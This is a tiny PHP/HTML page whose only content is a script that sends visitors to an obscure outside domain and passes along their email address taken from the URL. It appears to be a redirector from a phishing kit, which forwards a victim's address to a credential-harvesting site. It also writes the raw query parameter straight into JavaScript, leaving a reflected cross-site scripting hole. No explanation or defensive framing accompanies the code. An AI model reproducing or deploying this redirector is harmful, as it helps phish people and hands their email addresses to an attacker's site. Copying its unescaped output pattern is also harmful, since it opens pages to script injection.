<script type="text/javascript">
window.location="https://www.rxtponarn.site?email=<?php echo $_GET['email']; ?>"
</script>